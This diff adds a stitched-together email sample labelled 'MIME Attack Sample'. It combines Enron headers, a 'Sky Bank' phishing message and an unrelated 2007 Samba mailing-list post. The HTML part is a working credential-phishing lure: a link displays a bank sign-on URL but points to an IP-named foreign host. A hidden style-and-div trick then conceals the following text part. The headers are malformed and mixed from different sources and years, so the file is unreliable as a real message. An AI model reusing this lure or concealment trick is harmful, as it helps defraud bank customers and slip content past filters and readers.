@@ -1,0 +1,113 @@
+From: judy.e.collazo@ssmb.com
+To: john.arnold@enron.com, dutch.quigley@enron.com, l..nowlan@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+Content-Type: text/html
+Content-Type: text/html
+Message-Id: <20050825202546.2BA952C4BF@terra2.hms.com.au>
+Date: Fri, 26 Aug 2005 06:25:46 +1000 (EST)
+Content-Length: 2832
+Lines: 60
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 122
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <title>SkyFi</title>
+  <meta http-equiv="Content-Type"
+ content="text/html; charset=iso-8859-1">
+</head>
+<body>
+<img src="http://www.publiceyes.org/images/sky_logo.gif">
+<p align="left">    <font face="Verdana" size="2">Dear <b>Sky Bank Member</b><strong>, </strong>
+</font></p>
+<p align="left">    <font face="Verdana" size="2">This email is to inform you, that we had to 
+block your Sky Bank account access because we have been
+notified that your account may have been compromised by outside
+parties. </font> </p>
+<p align="left">    <font face="Verdana" size="2">Our terms and conditions you agreed
+to state that your account must always be under your control or those
+you designate at all times. We have noticed some<br>
+unusual activity related to your account that indicates that other
+parties may have access and or control of your details in your
+account. <br>
+<br>
+    These parties have in the past been involved with
+money laundering, illegal drugs, terrorism and various Federal Title 18
+violations. <br>
+</font>
+</p>
+<p align="left"><span
+ style="font-weight: bold; font-family:Verdana"><small>    <big><font size="2">Please follow this 
+link to complete your security verification and unlock your CARD</font></big></small></span><big><font
+ style="font-weight: bold;" face="Verdana"><font size="2"> </font> <small>
+<font size="2">check
+card</font></small></font><span
+ style="font-weight: bold; font-family:Verdana"><small><font size="2"> </font> </small></span>
+<font face="Verdana" size="2">:</font></big><font face="Verdana" size="2">
+</font> </p>
+<p align="left"><big>
+<span
+ style="font-weight: bold; font-family:Verdana"><small>
+<font size="2">
+<a target="_blank" target="_parent" href="http://61-30-43-18.static.tfn.net.tw/connect.skyfi.com/servlet/SignOnCustType=Retail&NLS=EN/">https://connect.skyfi.com/servlet/SignOn?CustType=Retail&NLS=EN</a></font></small></span><font face="Verdana" size="2">
+</font>
+</big></p>
+<p align="left">    <font face="Verdana" size="2">Please be aware that until we can
+verify your identity no further access to your account will be allowed
+and we will have no other liability for your account or any
+transactions that may have occurred as a result of your failure to
+reactivate your account as instructed above. </font> </p>
+<p align="left">    <font face="Verdana" size="2">Thank you for your time and
+consideration in this matter .<br>
+</font>
+</p>
+<p align="left">        <font face="Verdana" size="2">Sincerely,<br>
+     Sky Bank Accounts Department. </font> </p>
+<p><font size="2" face="Verdana"><br>
+Note: Requests for information will be initiated by our Sky Bank Business Development Group, this process cannot be externally expedited
+through Customer Support</font></p>
+</body>
+</html>
+<style>fieldset, br{display: none;}</style>
+<div style="display: none;"><plaintext>
+--BOUNDARY
+Content-Type: text/plain
+-BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Anyone have any insight into this one?
+
+http://build.samba.org/?function=View+Build;host=burns;tree=samba_3_0;compiler=gcc
+
+  RAW-SAMBA3HIDE
+  Tue May 22 16:26:39 CEST 2007
+  Testing RAW-SAMBA3HIDE
+  TEST OUTPUT:
+  Using seed 1179843999
+  r/w file not visible via hide unreadable
+  ERROR IN TEST SAMBA3HIDE! - Unknown error/failure
+
+
+
+
+cheers, jerry
+=====================================================================
+Samba                                    ------- http://www.samba.org
+Centeris                         -----------  http://www.centeris.com
+"What man is a man who does not make the world better?"      --Balian
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGUv/zIR7qMdg1EfYRAvuuAJ9q9p3p2in6qMOSXslO63maXSD2WwCePiHl
+7eMZP1u99IPlNnhqqBwRNio=
+=IDEq
+-----END PGP SIGNATURE-----
+
+-BOUNDARY--
